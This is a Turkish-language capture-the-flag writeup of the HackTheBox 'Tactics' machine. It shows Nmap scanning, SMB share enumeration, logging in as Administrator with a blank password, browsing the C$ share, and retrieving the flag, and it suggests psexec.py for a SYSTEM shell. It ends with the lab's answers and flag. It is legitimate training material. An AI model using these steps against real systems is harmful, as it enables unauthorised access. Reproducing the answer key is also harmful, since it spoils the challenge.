# HackTheBox — Tactics Writeup

**Zorluk:** Easy
**İşletim Sistemi:** Windows
**Hedef IP:** 10.129.184.220

---

## 1. Keşif (Reconnaissance)

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.220
```

**Çıktı:**

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-27T23:39:07
|_  start_date: N/A
```

> **Not:** Hedef makine ICMP (ping) paketlerine cevap vermediği için, standart bir Nmap taraması host'u "down" olarak işaretleyebilir. Bu tür durumlarda Windows güvenlik duvarının ping paketlerini engellediğini varsayıp Nmap'e host discovery adımını atlamasını, doğrudan port taramasına geçmesini söyleyen **`-Pn`** anahtarını kullanmak gerekiyor.

Tarama sonucunda karşımda klasik bir Windows makinesi profili var: **135 (RPC), 139 (NetBIOS-SSN), 445 (SMB)**. Bu üçlü kombinasyon, doğrudan **SMB (Server Message Block)** üzerinden dosya paylaşımı enumeration'ına yönlendiriyor beni.

---

## 2. SMB Enumeration — Paylaşımların Listelenmesi

İlk olarak anonim (null session) bir bağlantı deniyorum:

```bash
smbclient -L //10.129.184.220 -N
```

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

Anonim erişim reddediliyor — yani SMB, kimlik doğrulaması olmadan paylaşım listesini vermiyor. Bu durumda hedefte **`Administrator`** gibi standart/varsayılan bir hesabın var olabileceğini düşünerek onu deniyorum:

```bash
smbclient -L //10.129.184.220 -U Administrator
```

```
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

Şaşırtıcı bir şekilde **boş parola** ile (Enter'a basarak) `Administrator` hesabıyla oturum açabiliyorum ve tüm **Yönetimsel Paylaşımları (Administrative Shares)** görebiliyorum:

- **`ADMIN$`** — Windows kurulum dizinine (`C:\Windows`) erişim sağlayan yönetimsel paylaşım.
- **`C$`** — Sunucunun **tüm C: sürücüsüne** erişim sağlayan, kullanıcıların tüm dosya sistemini görüntülemesine olanak tanıyan yönetimsel paylaşım.
- **`IPC$`** — Süreçler arası iletişim (Inter-Process Communication) için kullanılan özel paylaşım.

Paylaşım adının sonundaki **`$`** karakteri, o paylaşımın gizli bir **yönetimsel paylaşım (administrative share)** olduğunu gösteriyor — normal dosya gezgininde görünmez, sadece tam yolunu bilen ve yeterli yetkiye sahip biri erişebilir.

---

## 3. C$ Paylaşımı Üzerinden Dosya Sistemine Erişim

`C$` paylaşımı bana sunucunun **tüm dosya sistemine** erişim imkânı verdiği için, doğrudan bu paylaşıma bağlanıyorum:

```bash
smbclient //10.129.184.220/C$ -U Administrator
```

Boş parola ile giriş yapıp `ls` komutuyla kök dizini listeliyorum:

```
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Thu Aug 27 19:36:28 2026
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 12:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul  7 14:05:23 2021
```

Standart bir Windows dizin yapısı görüyorum. Kullanıcı profillerinin bulunduğu `Users` dizinine yöneliyorum:

```
smb: \> cd Users
smb: \Users\> ls
  Administrator                       D        0  Wed Apr 21 11:23:32 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  Default                           DHR        0  Wed Apr 21 11:17:12 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  Public                             DR        0  Wed Apr 21 11:23:31 2021
```

`Administrator` klasörüne giriyorum ve masaüstünü kontrol ediyorum:

```
smb: \Users\> cd Administrator\
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> ls
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021
```

**`flag.txt`** dosyasını görüyorum. Doğrudan `smbclient` shell içinde `cat` veya `type` gibi Linux/Windows komutları çalışmıyor çünkü bu, `smbclient`'in kendi özel komut arayüzü — dosya sistemine SSH gibi doğrudan komut çalıştırma erişimim yok, sadece SMB protokolü üzerinden dosya işlemleri (list/get/put/del gibi) yapabiliyorum:

```
smb: \Users\Administrator\Desktop\> cat flag.txt
cat: command not found
smb: \Users\Administrator\Desktop\> type flag.txt
type: command not found
```

Bunun yerine dosyayı doğrudan kendi makineme indirmem gerekiyor. Bunun için `smbclient`'in **`get`** komutunu kullanıyorum:

```
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit
```

Dosya kendi Kali makineme indi. Şimdi rahatça okuyabilirim:

```bash
cat flag.txt
```

```
f751c19eda8f61ce81827e6930a1f40c
```

Flag başarıyla elde edildi. 🎉

---

## 4. Ek Not — Interaktif Shell İhtimali

Elimde `Administrator` kimlik bilgileri (boş parola) ve `C$` paylaşımına tam erişim olduğu için, aslında burada durmak zorunda değilim. **Impacket** araç setinin parçası olan **`psexec.py`** kullanılarak hedef üzerinde tam interaktif bir shell (SYSTEM yetkisiyle) de elde edilebilir:

```bash
psexec.py Administrator@10.129.184.220
```

`psexec.py`, SMB üzerinden hedef sisteme bir servis binary'si yükleyip çalıştırarak (klasik Sysinternals PsExec mantığıyla) uzaktan komut satırı erişimi sağlıyor. Bu makinede flag'e ulaşmak için buna gerek kalmadı, ancak ortamda daha fazla post-exploitation yapılması gerekseydi bu araç bir sonraki doğal adım olurdu.

---

## 5. Özet — Atak Zinciri

1. Hedef ICMP'ye cevap vermediği için Nmap `-Pn` anahtarıyla çalıştırıldı; 135 (RPC), 139 (NetBIOS-SSN) ve 445 (SMB) portlarının açık olduğu tespit edildi.
2. `smbclient -L` ile anonim SMB oturumu denendi, `NT_STATUS_ACCESS_DENIED` hatası alındı.
3. `Administrator` kullanıcı adıyla ve **boş parola** ile SMB paylaşım listesi (`ADMIN$`, `C$`, `IPC$`) başarıyla listelendi.
4. `C$` yönetimsel paylaşımı üzerinden sunucunun tüm dosya sistemine erişim sağlandı.
5. `Users\Administrator\Desktop` dizininde `flag.txt` dosyası bulundu.
6. `get` komutuyla dosya yerel makineye indirildi ve flag okundu.

---

## 6. Görev Soruları ve Cevapları

**Görev 1 — Windows güvenlik duvarı ping ICMP paketlerimizi engellediğinde makineleri listelemek için hangi Nmap anahtarını kullanabiliriz?**
`-Pn`

**Görev 2 — Üç harfli SMB kısaltması ne anlama geliyor?**
Server Message Block

**Görev 3 — SMB varsayılan olarak hangi bağlantı noktasından dinleme yapar?**
445

**Görev 4 — `smbclient` kullanılabilir paylaşımları listelemek için hangi komut satırı argümanını veriyorsunuz?**
`-L`

**Görev 5 — Bir hisse senedi adının sonundaki hangi karakter, o hisse senedinin yönetimsel bir hisse senedi olduğunu gösterir?**
`$`

**Görev 6 — Kullanıcıların tüm dosya sistemini görüntülemesine olanak tanıyan sunucuda hangi Yönetimsel paylaşım klasörüne erişilebilir?**
`C$`

**Görev 7 — SMB paylaşımında bulduğumuz dosyaları indirmek için hangi komutu kullanabiliriz?**
`get`

**Görev 8 — Impacket koleksiyonunun parçası olan hangi araç, sistemde etkileşimli bir kabuk elde etmek için kullanılabilir?**
`psexec.py`

**Tek Bayrak Gönder — Yöneticinin masaüstünde bulunan bayrağı gönderin.**
`f751c19eda8f61ce81827e6930a1f40c`

---

*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
